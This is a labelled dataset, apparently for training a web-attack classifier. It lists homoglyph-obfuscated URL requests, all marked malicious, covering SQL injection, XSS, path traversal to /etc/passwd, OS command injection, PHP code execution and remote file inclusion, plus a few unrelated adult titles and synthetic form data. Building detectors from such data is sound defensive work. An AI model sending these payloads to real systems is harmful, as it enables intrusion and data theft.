sentences 	 labels
/ 𝒕o𝖕 . php ? stuff =  ; uname  > q54934318  #  	 1
/ 𝑠𝕥ring / strings / parameters = 1 '  where 4039 = 4039 union all select null , null , null , null , null , null , null , null --  	 1
/ nꭎ𝖍3zirz . cgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝘴𝑡ring / modo = registro & login = nafsika & password = malhecho & nombre = jesumina & apellidos = -p-ia , na & email = cottrell @ muchochinoenchina . tg & dni = 44709161j & direccion = navaluenga ,  + 120 + 11 ? a & ciudad = orsoain & cp = 21840 & provincia = cuenca & ntc = 4344385269362154 & b1 = registrar  	 1
/ 𝔰𝓉ring / strings / parameters = 1 %  "  "  )  )  )  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  (  (  (  "  "  %  "  "  =  "  "  	 1
/ а𝟎imiuf1 . htm ?  < script > document . cookie =  " testxqrn = 4654 ;  "  <  / script >  	 1
/ 𝚜𝑡ring / strings / parameters = "  "  <  / comment >  < img src = x onerror = alert ( 1 )  /  /  "  "  >  	 1
/ 𝐬𝐭ring / strings / parameters = 1 "  "  )  and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  (  "  " ccuy "  "  =  "  " ccuy  	 1
/ 𝓈𝓽ring / strings / parameters = �? or 1 = 1  --  	 1
/ 𝙨𝙩ring / strings / parameters = -1 < style >  <  !  --  <  / style >  < script > document . cookie = true ;  /  /  --  >  <  / script >  	 1
/ 𝒔𝘵ring / strings / parameters = 1 )  and  ( 7557 = 1711 )  * 1711 and  ( 5157 = 5157  	 1
/ ƽ𝓽ring / strings / parameters = 1 %  '  )  union all select null , null , null --  	 1
/ 𑣕𝓆bynt4f . asp ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ ꜱ𝚝ring / strings / parameters = echo gbxopj $  (  ( 13 + 32 )  )  $  ( echo gbxopj ) gbxopj  	 1
/ 𝕤𝕥ring / strings / parameters = -6514 )  )  as pbgg where 6841 = 6841 union all select 6841 , 6841 , 6841 , 6841 --  	 1
/ 𝕤𝗍ring / strings / parameters = -7379 union all select 9813 , 9813 , 9813 , 9813 , 9813 , 9813 , 9813 , 9813 --  	 1
/ 𝟶𝙧ufe52p . pl ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝘀𝓽ring / strings / parameters = 1 %  "  "  or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  "  "  %  "  "  =  "  "  	 1
/ ѕ𝒕ring / strings / parameters = 1 %  "  "  )  ; if ( 9953 = 4347 )  select 9953 else drop function ocau --  	 1
/ 𝗌𝓽ring / modo = registro & login = teriann & password = bim42or & nombre = archibaldo & apellidos =  , arbiol + farren . y & email = seidler . pedro @ investopi . bt & dni = 69492946x & direccion = c /  + isabel + ii + 151 ,  + 2b & ciudad = vilamalla & cp = 09450 & provincia = zamora & ntc = 6106115865632521 & b1 = registrar  	 1
/ 𝓹𝒽print . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331905034 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00  	 1
/ m𝑎ⅈn . php ? stuff =  '  \ x0dsleep 9  #  	 1
/ 𝔰𝕥ring / strings / parameters = 1 where 9072 = 9072 and elt ( 4249 = 4249 , 7259 )  --  	 1
/ 𑣁𝔱ring / strings / parameters = union  /  *  ! select *  /   /  *  !  @  @ datadir *  /  	 1
/ 𝒔𝓉ring / str =  $  ( echo fufpkn )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  	 1
/ m𝒂𝖎n . php ? logout =  "  & ping ; -w ; 10000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ;  	 1
/ 𐑈𝖙ring / strings / parameters = ;  str =  $  ( echo knetda )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  	 1
/ 𝐬𝙩ring / strings / parameters = < a href =  " javascript : name "  > click <  / a >  	 1
/ ƽ𝙩ring / strings / parameters = "  |   [  9 -ne  $  ( echo jlfvec  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  	 1
/ 𝖘𝙩ring / strings / parameters = -1332 )  as qtbb where 7261 = 7261 or 1 group by concat ( 0x7171706a71 ,  ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  )  having min ( 0 )  #  	 1
/ 𝑒𝘹amples / jsp / colors / shopper . cgi ? newpage =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝓭𝕓 / polldb . php ? config_datareaderwriter = xxpathxx ?  	 1
/ 𝟳o𝟱qp766 . php ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝐬𝒕ring / strings / parameters = ; echo jyxfus $  (  ( 22 + 98 )  )  $  ( echo jyxfus ) jyxfus &  	 1
/ 𝘀𝕥ring / strings / parameters = 1 ; select benchmark ( 5000000 , md5 ( 0x4c4d6142 )  )  #  idxq  	 1
/ ƽ𝑡ring / strings / parameters = 1 '  ,  ( select  ( case when  ( 8640 = 8640 )  then  ( ascii ( regexp_substring ( repeat ( right ( char ( 8640 )  , 0 )  , 500000000 )  , null )  )  )  else 8640 /  ( select 0 from information_schema . system_users )  end )  from information_schema . system_users )  --  	 1
/ еn-𝙪s / 33y9gcqq . html ?  < meta http-equiv = set-cookie content =  " testnvxc = 4301 "  >  	 1
/ 𝘴𝘵ring / strings / parameters = 1 union all select null , null , null , null , null , null , null , null , null --  	 1
/ α𝗐stats / awstats . pl ? migrate =  | echo ;  /  .  / tmp / xmefwyizyj0  >   / dev / null  &  ; echo | awstats852068 . txt  	 1
/ 𝗌𝔱ring / modo = entrar & login = any set-cookie :  + tamper = 1041264011025374727 & pwd = 2anc580a95r & remember = off & b1 = entrar  	 1
/ р𝒉ptonuke . php ? filnavn =  / etc / passwd  	 1
/ ƽ𝚌ript / index . php ? path_inc = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  	 1
/ 𝒆𝙨mozg5d . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝒆×amples / jsp / security / protected / is_cgi_installed3_ . j_security_check ; jsessionid = 5680ad1b9956cf0a8a9f08a20f983ee61893221447 . swp  	 1
/ m𝒶𝗂n . php ? logout =  " ver & rem \ xa0  	 1
/ 𝙨𝒕ring / strings / parameters = |   [  9 -ne  $  ( echo mclzrv  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/ 𝗌𝙩ring / strings / parameters = -3347 '  +  ( select xuzs where 1076 = 1076 union all select 1076 , 1076 , 1076 , 1076 , 1076 --  	 1
/ 𐑈oꭎrces / functions . php ? root_path =  / etc / passwd \ x00  	 1
/ 𝔢⤬amples / jsp / checkbox / forumdisplay . php ? fid = 21 "  >  < script > x <  / script >  	 1
/ 𐑈𝕥ring / strings / parameters = " echo $ ifswkativ $  (  ( 60 + 61 )  )  $  ( echo $ ifswkativ ) wkativ  	 1
/ 𝔥ҽlp . php ? q =  "  & rm q34212187  #  	 1
/ 𝒶𝙬stats / awstats . pl ? migrate =  | echo ; chmod 555  / tmp / gjehhrjnrx0 ; echo | awstats679107 . txt  	 1
/ 𝕤𝙩ring / strings / parameters = echo ghwfxg $  (  ( 12 + 72 )  )  $  ( echo ghwfxg ) ghwfxg "  	 1
/ 𝘴𝑡ring / strings / parameters = http :  /  / www . google < script  . com > alert ( document . location )  <  / script  	 1
/ 𝖘𝓉ring / id = 3 & nombre = queso + manchego & precio = 39 /  & cantidad = 57 & b1 = aadir + al + carrito  	 1
/ 𝗌𝘁ring / modo = entrar & login = kilner & pwd = gurbia & remember =  ' or ' a =  ' a & b1 = entrar  	 1
/ 𝗰ɡi-bin / yabb . pl ? board = news & action = display & num =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ сommℯnts . php ? scriptpath = http :  /  / 192 . 168 . 202 . 96 : 8080 / no4ghqiguzhst ?  ?  	 1
/ 𝑖nԁex . php ?  "  >  < script > alert ( 411775577573 )  <  / script >  	 1
/ ѕ𝘁ring / strings / parameters = 1 '  rlike  ( select  ( case when  ( 5384 = 7060 )  then 1 else 0x28 end )  )  	 1
/ m𝖆іn . php ? logout =  " ping ; -w ; 10000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ;  	 1
/ 𝗌𝔱ring / strings / parameters = 1 '  |  |  ( select  ' vuku '  where 3143 = 3143 waitfor delay  ' 0 : 0 : 5 '  --  	 1
/ 𑣁𝖙ring / modoa = registro & login = beth & password = romanizar & nombre = numa & apellidos = villalta + tapasco & email = modica @ boda-barata . kw & dni = 35697894p & direccion = masia + can + pere + riera + petit + 14 ,  +  & ciudad = xove & cp = 05560 & provincia = cantabria & ntc = 3116780523679392 & b1 = registrar  	 1
/  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / windows / win . ini  	 1
/ 𝓈𝗍ring / strings / parameters = -7395 %  "  "  order by 1 --  	 1
/ 𝚜𝚝ring / strings / parameters = 1 '  ; select  ( case when  ( 7990 = 7627 )  then 7990 else 1 /  ( select 0 )  end )  --  	 1
/ 𝚑𝖾lp . php ? q =  "  | ping \ x0c-w \ x0c8000 \ x0c-n \ x0c1 \ x0c1 . 2 . 3 . 4 | rem \ x0c  	 1
/ ѕ𝕥ring / str =  $  ( echo eigkoy )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  	 1
/ ҽ᙮amples / jsp / sessions / index . php ? act = arcade & do = stats & gameid = 1 '  	 1
/ 𝚢טer8r9o . pl ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝚜𝚝ring / modo = entrar & login = margalo & pwd = distilatorio & remember = off /  & b1 = entrar  	 1
/ 𝒔𝚝ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hsrgrg )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 1
/ 𝖘𝘵ring / strings / parameters = 1 "  "  rlike  ( select  *  from  ( select ( sleep ( 5 )  )  ) sgvo )  and  "  " wcze "  "  =  "  " wcze  	 1
/ ƽ𝓉ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo fkfulk )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 1
/ 𝖘𝘵ring / strings / parameters = 1 and 3824 = benchmark ( 5000000 , md5 ( 0x76555642 )  )  #  igen  	 1
/ ѕ𝒕ring / modo = entrar & login = pagi & pwd = cal ,  , 8 , ndar & remember = off & b1 = entrar  	 1
/ 𝒔𝗍ring / strings / parameters = &  & echo $ ifswaewha $  (  ( 84 + 51 )  )  $  ( echo $ ifswaewha ) waewha '  	 1
/ 𝕕𝖺ddy ' s little princess - sasha knox /  	 1
/ m𝕒ⅰn . php ? stuff =  '  \ x0adel q61656815  #  	 1
/ ƽ𝒄ripts / adodb-perf-module . inc . php ? last_module = zzz_adoconnection {  } system ( id )  ; class zzz_adoconnection {  }  /  /  	 1
/ j𝓪𝐯ascript / boot . exe  	 1
/ 𝕤𝘁ring / modo = entrar & login = wilken & pwd = r5pa2el0s & remember = off /  & b1 = entrar  	 1
/ 𝒶𝙙dvip . php ? msetstr [  " progsdir "  ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / vir0v3xfc ?  	 1
/ հ𝟜bi26jd . nsf ?  < script > document . cookie =  " testhrzx = 1150 ;  "  <  / script >  	 1
/ ᙮𑣆pclv4s . html ?  < meta http-equiv = set-cookie content =  " testiulz = 3709 "  >  	 1
/ j𝐚𝙫ascript / body . exe  	 1
/ 𝘀𝔱ring / strings / parameters = -5043 %  '  )  )  )  union all select 5860 , 5860 , 5860 , 5860 , 5860 #  	 1
/ 𝐛𝖎n / cgi-test . exe  	 1
/ 𝑠𝔱ring / strings / parameters = "  |   [  4 -ne  $  ( echo mnlbvu  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/ 𐑈𝖼ript_path / cms / classes / openengine / filepool . php ? oe_classpath = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ?  	 1
/ 𝕨𝐞bcgi / r . cgi ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𐑈𝗍ring / strings / parameters = %  '  }  )  ;  alert ( 1 )  ;   /  /  	 1
/ jɑ𝘷ascript / message . exe  	 1
/ ⅇ᙮amples / jsp / colors / store . cgi ? startid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html  	 1
/ ѕ𝗍ring / strings / parameters = 1 '  |  |  ( select  ' ersu '  where 4123 = 4123 and 8312 = dbms_pipe . receive_message ( chr ( 69 )  |  | chr ( 79 )  |  | chr ( 101 )  |  | chr ( 68 )  , 5 )  --  	 1
/ 𝙝𝖾lp . php ? q =  " ping ; -w ; 11000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ;  	 1
/ 𝐬հop / normal_html . cgi ? file =  ; cat  / etc / passwd |  	 1
/ 𝘴𝘵ring / strings / parameters = < link href =  " http :  /  / host / xss . css "  >  	 1
/ 𝚎𝕩amples / jsp / checkbox / sojourn . cgi ? cat =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ ƽ𝗍ring / strings / parameters = 1 "  "  )  where 8953 = 8953 or 5356 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  --  	 1
/ Ƅɩblioteca / sog_save . php ? classpath = xxpathxx  	 1
/ mɑn𝑎ger / search =  < script > alert (  ' xss '  )  <  / script >  	 1
/ ꜱ𝓉ring / strings / parameters = -2912 '  )  )  order by 1 --  	 1
/ 𝔰𝔱ring / strings / parameters = "  /  >  < isindex action =  " javas & tab ; cript : confirm ( 1 )  "  type = image >  	 1
/ ƽ𝓉ring / strings / parameters = |   [  6 -ne  $  ( echo wigalp  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 1
/ m𝕒𝐢n . php ? stuff =  '  \ x0duname  > q65565224  #  	 1
/ 𝗌𝕥ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo bfmcie )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 1
/ ƽ𝓉ring / strings / parameters = & echo ogaqad $  (  ( 97 + 22 )  )  $  ( echo ogaqad ) ogaqad &  	 1
/ j𝖆𝕧ascript / document . bin  	 1
/ 𝓉o𝐩 . php ? stuff = ping ; -w ; 10000 ; -n ; 1 ; 4 . 3 . 2 . 1 & rem ;  	 1
/ 𝔠ℊi-bin / csnewspro . cgi ? command = savesetup & setup =  ; system (  ' cat  / etc / passwd '  )  	 1
/ 𑣁𝙩ring / strings / parameters = ;  str =  $  ( echo vhbjgh )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 1
/ 𝕤𝘵ring / str =  $  ( echo nwelwc )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  	 1
/ 𝔢𝗏b / check_url . php ? url = pligg_url_sql_injection . nasl '  union select 1332010400 , 256728797  --  	 1
/ 𝚜𝘁ring / strings / parameters = 1 and make_set ( 6911 = 1867 , 1867 )  	 1
/ գ𝐮agynka . do ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ jαᴠascript / pr0n . exe  	 1
/ 𝘀𝒕ring / strings / parameters = 1 '  )  )  and make_set ( 8403 = 8403 , 8899 )  and  (  (  ' lokx '  like  ' lokx  	 1
/ ν𝐡zmaia2 . exe ?  < script > document . cookie =  " testkogj = 3979 ;  "  <  / script >  	 1
/ 𝓼𝓉ring / errormsg =  '  + delete + from + users  	 1
/ 𐑈𝘁ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fagbbn )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 1
/ 𝘴𝕥ring / id = 3 & nombre = jamn + ibrico & precio = 39 /  & cantidad = 90 & b1 = aadir + al + carrito  	 1
/ 𝑠𝕥ring / strings / parameters = 1 '  )  ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  #  	 1
/ 𝓮n-ᴜs / jnv890lt . nsf ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝒸ցi-home / ion-p ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝘴𝒸ripts / pollit / poll_it_ssi_v2 . 0 . cgi ? data_dir =  / etc / passwd \ x00  	 1
/ 𝓼𝑡ring / strings / parameters = < svg / onload = window . onerror = alert ; throw / xss /  ;  /  /  	 1
/ ƽ𝕥ring / strings / parameters = < import namespace =  " t "  implementation =  "  # default # time2 "  >  	 1
/ 𝔁oo𝕡s232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / iyeafeugpn0 +  >  +  / dev / null +  &  '  )  ;  function v  	 1
/ ꜱ𝘁ring / strings / parameters = -3116 )  )  as jyiq where 3875 = 3875 union all select 3875 , 3875 , 3875 , 3875 , 3875 , 3875 , 3875 , 3875 #  	 1
/ 𝙞nⅆex . php ? news7 [  " functions "  ]  = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  	 1
/ 𐑈𝚝ring / strings / parameters = &  & echo $ ifslxpmrf $  (  ( 61 + 87 )  )  $  ( echo $ ifslxpmrf ) lxpmrf |  	 1
/ 𝟬𝘲hcnefz . mscgi ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝔰𝕥ring / modo =  < script > alert (  " paros "  )  ;  <  / script >  & login = marlee-j5 & pwd = ple4n637127 & remember = on & b1 = entrar  	 1
/ 𝘴𝒕ring / strings / parameters = 1 %  '  )  )  )  ; waitfor delay  ' 0 : 0 : 5 '  and  (  (  (  '  %  '  =  '  	 1
/ 𝔭αth / nw / article . php ? id =  '  	 1
/ 𝚒nᏧex . php ? 1 = lol & pages [ lol ]  = xxpathxx  	 1
/ 𝘀𝐭ring / strings / parameters = 1 '  )  where 6408 = 6408 ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  	 1
/ 𝗌𝘁ring / strings / parameters = "  \  "  >  < img src = x onerror = x . onerror = confirm ( 1 )  ; prompt ( 2 )  ; confirm (  / xss /  . source )  ; prompt ( string . fromcharcode ( 88 , 83 , 83 )  )  >  "  ,  	 1
/ 𝚜𝚝ring / strings / parameters = < img [ a ]  [ b ] src = x [ d ] onerror [ c ]  =  [ e ]  " alert ( 1 )  "  >  	 1
/  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows \ win . ini  	 1
/ 𝕤𝒕ring / strings / parameters = "  ;  str =  $  ( echo udcjaj )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 1
/ 𝗀𝗿aph . php ? document_root = xxpathxx ?  	 1
/ ƽ𝚝ring / strings / parameters = '  |  | echo $ ifsubxjuf $  (  ( 52 + 61 )  )  $  ( echo $ ifsubxjuf ) ubxjuf  	 1
/ j𝒂𝓬k ' s big tit show /  	 1
/ 𝘦𝙭amples / jsp / cal / plugins / safehtml / htmlsax3 . php ? dir [ plugins ]  =  / etc / passwd \ x00  	 1
/ 𝓈𝖙ring / modo = entrar & login = dionysus & pwd = vuesa & remember = on /  & b1 = entrar  	 1
/ 𝚌𝕘iip . exe / wservice = wsbroker1 / webutil / ping . p  	 1
/ 𝔰𝓉ring / strings / parameters = |   [  2 -ne  $  ( echo zdevvw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 1
/ 𝕤𝑡ring / strings / parameters = 1 ,  ( select  ( case when  ( 5154 = 5154 )  then 1 else 5154 *  ( select 5154 from master .  . sysdatabases )  end )  )  	 1
/ 𝗌𝐭ring / strings / parameters = |   [  5 -ne  $  ( echo kbhdas  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 1
/ 𝘴𝗍ring / id = 1 	 1
/ 𝔰𝑡ring / strings / parameters = 1 %  '  ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  	 1
/ ⅇ𝙭amples / jsp / checkbox / htgrep / file = index . html & hdr =  / etc / passwd  	 1
/  < meta http-equiv = set-cookie content =  " testwtbo = 4831 "  >  	 1
/ 𝐞⤬amples / jsp / error / plog-download . php ? dl_type = album & checked [  ]  =  '  union select  ' plogger_checked_sql_injection . nasl '  , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0  --  	 1
/ 𝑠𝓽ring / strings / parameters = 1 '  and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  ' eqle '  =  ' eqle  	 1
/ 𐑈𝘵ring / strings / parameters = |   [  4 -ne  $  ( echo skwmfk  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 1
/ 𝘀𝒕ring / strings / parameters = 1 %  '  )  ; select  ( case when  ( 3773 = 3722 )  then 3773 else 3773 *  ( select 3773 from mysql . db )  end )  #  	 1
/ 𝚜𝔱ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo gikitn )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  /  /  	 1
/ 𝑏⤫nyrhmh . jspa ?  < meta http-equiv = set-cookie content =  " testmjct = 1867 "  >  	 1
/ mooᑯlҽ / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + n + ctdnu . com +  > ctdn  	 1
/ ԝ𝓮bcgi / powerup / r . cgi ? file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝚜𝒕ring / strings / parameters = |   [  6 -ne  $  ( echo parklw  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  	 1
/ 𐑈𝗍ring / strings / parameters = 1 %  '  ; begin dbms_lock . sleep ( 5 )  ;  end --  	 1
/ 𝕤𝖙ring / strings / parameters = 1 %  "  "  )  )  rlike sleep ( 5 )  and  (  (  "  "  %  "  "  =  "  "  	 1
/ 𝗽𝓱pmyadmin / ikonboard . cgi ? act = st & f = 1 & t = 1 & hl = nessus & st =  '  	 1
/ 𝕙𑢻i6crm3 . do ?  < meta http-equiv = set-cookie content =  " testlihk = 7070 "  >  	 1
